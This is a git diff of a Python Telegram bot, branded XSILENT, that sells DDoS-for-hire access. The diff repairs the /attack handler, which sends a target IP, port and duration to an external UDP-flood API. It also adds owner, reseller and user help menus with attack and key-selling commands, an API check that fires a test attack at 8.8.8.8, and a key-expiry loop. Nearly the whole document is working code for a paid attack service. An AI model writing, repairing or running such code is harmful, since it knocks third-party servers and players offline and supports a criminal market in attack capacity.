@@ -920,43 +920,38 @@ def attack(msg):
     bot.reply_to(msg, f"✨ ATTACK LAUNCHED! ✨\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n⚡ Method: UDP (Auto)\n📊 Total active slots: {new_total}/{MAX_CONCURRENT}")
     
     def run():
-    def run():
-    retry = 0
-    while retry < 3:
-        try:
-            api_params = {
-                "api_key": API_KEY,
-                "target": ip,
-                "port": port,
-                "time": duration,
-                "concurrent": 1,
-                "method": "udp"
-            }
-            
-            response = requests.get(API_URL, params=api_params, timeout=10)
-            
-            if response.status_code == 200:
-                time.sleep(duration)
-                bot.send_message(msg.chat.id, f"✅ ATTACK FINISHED!\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n🔄 Restart your game!")
-                break
-            else:
+        retry = 0
+        while retry < 3:
+            try:
+                api_params = {
+                    "api_key": API_KEY,
+                    "target": ip,
+                    "port": port,
+                    "time": duration,
+                    "concurrent": 1,
+                    "method": "udp"
+                }
+                response = requests.get(API_URL, params=api_params, timeout=10)
+                if response.status_code == 200:
+                    time.sleep(duration)
+                    bot.send_message(msg.chat.id, f"✅ ATTACK FINISHED!\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n🔄 Restart your game!")
+                    break
+                else:
+                    retry += 1
+                    if retry < 3:
+                        time.sleep(2)
+                        continue
+                    bot.send_message(msg.chat.id, f"❌ Attack failed!\n\n🛒 Contact: XSILENT")
+            except Exception as e:
                 retry += 1
                 if retry < 3:
                     time.sleep(2)
                     continue
-                bot.send_message(msg.chat.id, f"❌ Attack failed!\n\n🛒 Contact: XSILENT")
-                
-        except Exception as e:
-            retry += 1
-            if retry < 3:
-                time.sleep(2)
-                continue
-            bot.send_message(msg.chat.id, f"❌ Attack failed! API offline.\n\n🛒 Contact: XSILENT")
+                bot.send_message(msg.chat.id, f"❌ Attack failed! API offline.\n\n🛒 Contact: XSILENT")
+        if attack_id in active_attacks:
+            del active_attacks[attack_id]
     
-    if attack_id in active_attacks:
-        del active_attacks[attack_id]
-
-threading.Thread(target=run).start()
+    threading.Thread(target=run).start()
 
 @bot.message_handler(commands=['status'])
 def status(msg):
@@ -1050,7 +1045,6 @@ def unhost_bot(msg):
     bot_token = args[1]
     
     if bot_token in hosted_bots:
-        # Stop the hosted bot
         stop_hosted_bot(bot_token)
         bot.reply_to(msg, f"✅ HOSTED BOT STOPPED AND REMOVED!\n\n🔑 Token: {bot_token[:20]}...")
     else:
@@ -1628,4 +1622,113 @@ def help_cmd(msg):
 /removegroup GROUP_ID - Remove group
 
 /host BOT_TOKEN USER_ID CONCURRENT NAME - Host bot
-                
+/unhost BOT_TOKEN - Remove hosted bot
+
+/maintenance on/off - Maintenance mode
+/broadcast - Broadcast (text/photo/video)
+/stopattack IP:PORT - Stop attack
+/allusers - List users
+/allgroups - List groups
+/allhosts - List hosted bots
+/api_status - API status
+
+⚡ Concurrent: {MAX_CONCURRENT}
+⏳ Cooldown: {COOLDOWN_TIME}s
+🛒 Buy: XSILENT""")
+    elif uid in resellers:
+        bot.reply_to(msg, f"""💎 XSILENT RESELLER HELP 💎
+
+📝 COMMANDS:
+
+/attack IP PORT TIME - Launch attack
+/status - Check slots
+/cooldown - Check your cooldown
+/genkey 1 or 5h - Generate key
+/mykeys - Your keys
+
+⚡ Concurrent: {MAX_CONCURRENT}
+⏳ Cooldown: {COOLDOWN_TIME}s
+🛒 Buy: XSILENT""")
+    elif uid in users:
+        bot.reply_to(msg, f"""🔥 XSILENT USER HELP 🔥
+
+📝 COMMANDS:
+
+/attack IP PORT TIME - Launch attack
+/status - Check slots
+/cooldown - Check your cooldown
+/redeem KEY - Activate key
+
+⚡ Concurrent: {MAX_CONCURRENT}
+⏳ Cooldown: {COOLDOWN_TIME}s
+🛒 Buy: XSILENT""")
+    else:
+        bot.reply_to(msg, f"❌ Unauthorized!\n\nUse /redeem KEY to activate\n\n🛒 Buy: XSILENT")
+
+@bot.message_handler(commands=['allusers'])
+def all_users(msg):
+    if check_maintenance():
+        bot.reply_to(msg, maintenance_message)
+        return
+    
+    if str(msg.chat.id) not in ADMIN_ID:
+        bot.reply_to(msg, "❌ Owner only!")
+        return
+    
+    user_list = []
+    for u in users:
+        if u in ADMIN_ID:
+            role = "👑 OWNER"
+        elif u in resellers:
+            role = "💎 RESELLER"
+        else:
+            role = "👤 USER"
+        user_list.append(f"{role}: {u}")
+    
+    bot.reply_to(msg, f"📋 ALL USERS:\n\n" + "\n".join(user_list) + f"\n\n📊 Total: {len(users)}")
+
+@bot.message_handler(commands=['api_status'])
+def api_status(msg):
+    if check_maintenance():
+        bot.reply_to(msg, maintenance_message)
+        return
+    
+    if str(msg.chat.id) not in ADMIN_ID:
+        bot.reply_to(msg, "❌ Owner only!")
+        return
+    
+    try:
+        test_response = requests.get(f"{API_URL}?api_key={API_KEY}&target=8.8.8.8&port=80&time=5&concurrent=1", timeout=5)
+        api_status_text = "Online" if test_response.status_code == 200 else "Offline"
+        bot.reply_to(msg, f"✅ API STATUS\n\n📡 Status: {api_status_text}\n🎯 Active Attacks: {len(active_attacks)}")
+    except:
+        bot.reply_to(msg, "❌ API OFFLINE")
+
+def cleanup_attacks():
+    while True:
+        time.sleep(5)
+        now = time.time()
+        
+        for attack_id, info in list(active_attacks.items()):
+            if now >= info["finish_time"]:
+                del active_attacks[attack_id]
+        
+        for key, info in list(keys_data.items()):
+            if info.get("used", False) and now > info["expires_at"]:
+                user_id = info.get("used_by")
+                if user_id and user_id in users and user_id not in ADMIN_ID:
+                    users.remove(user_id)
+                    users_data["users"] = users
+                    save_users(users_data)
+
+cleanup_thread = threading.Thread(target=cleanup_attacks, daemon=True)
+cleanup_thread.start()
+
+print("✨ XSILENT BOT STARTED ✨")
+print("👑 Owner: 8487946379")
+print(f"⚡ Max Concurrent: {MAX_CONCURRENT}")
+print(f"⏳ Cooldown: {COOLDOWN_TIME}s")
+print(f"📊 Hosted Bots: {len(hosted_bots)}")
+print(f"📢 Broadcast Users: {len(broadcast_users)}")
+
+bot.infinity_polling()
